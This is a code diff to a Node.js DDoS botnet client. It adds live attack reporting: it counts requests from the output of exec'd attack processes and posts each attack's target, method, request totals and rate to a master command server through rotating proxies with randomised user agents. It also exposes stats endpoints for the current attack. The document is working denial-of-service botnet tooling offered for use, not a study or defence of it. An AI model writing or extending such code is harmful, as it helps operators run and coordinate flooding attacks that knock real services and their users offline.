@@ -89,6 +89,16 @@ async function startBot() {
   let proxyList = []; // Store proxies
   let currentProxyIndex = 0;
 
+  // ========== NEW LIVE REPORTING STATS ==========
+  let requestCount = 0;
+  let totalRequests = 0;
+  let requestLog = [];
+  let lastReportTime = Date.now();
+  const REPORT_INTERVAL = 60000; // Report every minute
+  let currentAttack = null;
+  let attackStartTime = null;
+  // ========== END NEW STATS ==========
+
   // Middleware
   app.use(express.json());
   app.use(cookieParser());
@@ -143,6 +153,72 @@ async function startBot() {
     return randomUseragent.getRandom();
   }
 
+  // ========== NEW REPORTING FUNCTION ==========
+  async function sendBatchReport() {
+    if (!currentAttack) return;
+    
+    const now = Date.now();
+    const duration = Math.floor((now - attackStartTime) / 1000);
+    
+    // Calculate requests for this batch
+    const batchRequests = requestCount - (currentAttack.lastReportedCount || 0);
+    const rps = duration > 0 ? (totalRequests / duration).toFixed(1) : 0;
+    
+    const report = {
+      botUrl: myBotUrl,
+      target: currentAttack.target,
+      method: currentAttack.methods,
+      requests: batchRequests,
+      totalRequests: totalRequests,
+      duration: duration,
+      rps: parseFloat(rps),
+      timestamp: now,
+      attackId: currentAttack.id
+    };
+
+    try {
+      const config = {};
+      const agent = createProxyAgent(MASTER_SERVER);
+      if (agent) {
+        config.httpsAgent = agent;
+        config.proxy = false;
+      }
+
+      await axios.post(`${MASTER_SERVER}/api/report`, report, {
+        timeout: 5000,
+        headers: {
+          'Content-Type': 'application/json',
+          'User-Agent': getRandomUserAgent()
+        },
+        ...config
+      });
+
+      // Update last reported count
+      currentAttack.lastReportedCount = requestCount;
+      
+      // Show live stats in console
+      console.log(`\n📊 [LIVE REPORT]`.cyan.bold);
+      console.log(`   Target: ${currentAttack.target}`.yellow);
+      console.log(`   Method: ${currentAttack.methods}`.magenta);
+      console.log(`   Requests: ${totalRequests}`.green);
+      console.log(`   RPS: ${rps}/s`.blue);
+      console.log(`   Duration: ${duration}s`.cyan);
+      
+    } catch (error) {
+      console.log(`[REPORT] Failed to send: ${error.message}`.red);
+    }
+  }
+
+  // Start reporting interval
+  setInterval(sendBatchReport, REPORT_INTERVAL);
+
+  // Track request function - call this from attack methods
+  function trackRequest() {
+    requestCount++;
+    totalRequests++;
+  }
+  // ========== END REPORTING ==========
+
   async function fetchData() {
     try {
       const response = await fetch('https://httpbin.org/get');
@@ -157,6 +233,7 @@ async function startBot() {
       console.log(`🔗 Master:   ${MASTER_SERVER}`.yellow);
       console.log(`🔄 Status:   Auto-registration ENABLED`.magenta);
       console.log(`💓 Heartbeat: Every 30 seconds`.blue);
+      console.log(`📊 Reports:  Every 60 seconds`.green);
       console.log(`🕸️  Proxies:   ${proxyList.length} loaded`.cyan);
       console.log('='.repeat(40).cyan + '\n');
       
@@ -260,7 +337,7 @@ async function startBot() {
         headers: { 'User-Agent': getRandomUserAgent() },
         ...config
       });
-      console.log(`💓 [HEARTBEAT] Sent to master | Status: ONLINE`.green);
+      console.log(`💓 [HEARTBEAT] Sent to master | Status: ONLINE | 📊 Total Reqs: ${totalRequests}`.green);
     } catch (error) {
       console.log(`💔 [HEARTBEAT] Failed | Status: OFFLINE`.red);
       console.log(`🔄 Re-registering with master...`.yellow);
@@ -317,11 +394,24 @@ async function startBot() {
     });
     
     activeProcesses = [];
+    currentAttack = null;
+    attackStartTime = null;
+    requestCount = 0;
     console.log(`✅ All attacks stopped\n`.green);
   }
 
   // Execute attack methods
   function executeAttack(target, time, methods) {
+    // Create new attack session for reporting
+    currentAttack = {
+      id: Date.now(),
+      target,
+      methods,
+      lastReportedCount: 0
+    };
+    attackStartTime = Date.now();
+    requestCount = 0;
+
     const execWithLog = (cmd) => {
       console.log(`⚡ [EXEC] ${cmd}`.cyan);
       const proc = exec(cmd, { detached: true }, (error, stdout, stderr) => {
@@ -329,8 +419,26 @@ async function startBot() {
           console.error(`❌ [ERROR] ${error.message}`.red);
           return;
         }
-        if (stdout) console.log(`📤 [OUTPUT] ${stdout}`.gray);
-        if (stderr) console.error(`📥 [STDERR] ${stderr}`.yellow);
+        if (stdout) {
+          // Count requests in output (simple parsing)
+          const lines = stdout.split('\n');
+          lines.forEach(line => {
+            if (line.includes('Request') || line.includes('GET') || line.includes('POST') || line.includes('Sending')) {
+              trackRequest();
+            }
+          });
+          console.log(`📤 [OUTPUT] ${stdout}`.gray);
+        }
+        if (stderr) {
+          // Also count errors as requests?
+          const lines = stderr.split('\n');
+          lines.forEach(line => {
+            if (line.includes('Request') || line.includes('GET') || line.includes('POST')) {
+              trackRequest();
+            }
+          });
+          console.error(`📥 [STDERR] ${stderr}`.yellow);
+        }
       });
       
       activeProcesses.push(proc);
@@ -434,9 +542,32 @@ async function startBot() {
       bot: 'ready',
       uptime: process.uptime(),
       activeAttacks: activeProcesses.length,
+      totalRequests: totalRequests,
+      currentAttack: currentAttack ? {
+        target: currentAttack.target,
+        method: currentAttack.methods,
+        duration: Math.floor((Date.now() - attackStartTime) / 1000),
+        requests: requestCount
+      } : null,
       proxies: proxyList.length,
       userAgent: getRandomUserAgent(),
       cookies: req.cookies
+    });
+  });
+
+  // Stats endpoint
+  app.get('/stats', (req, res) => {
+    res.json({
+      totalRequests: totalRequests,
+      activeAttacks: activeProcesses.length,
+      currentAttack: currentAttack ? {
+        target: currentAttack.target,
+        method: currentAttack.methods,
+        duration: Math.floor((Date.now() - attackStartTime) / 1000),
+        requests: requestCount,
+        rps: attackStartTime ? (totalRequests / ((Date.now() - attackStartTime) / 1000)).toFixed(1) : 0
+      } : null,
+      uptime: process.uptime()
     });
   });
 
@@ -448,6 +579,7 @@ async function startBot() {
       uptime: process.uptime(),
       timestamp: Date.now(),
       status: 'online',
+      totalRequests: totalRequests,
       userAgent: req.headers['user-agent']
     });
   });
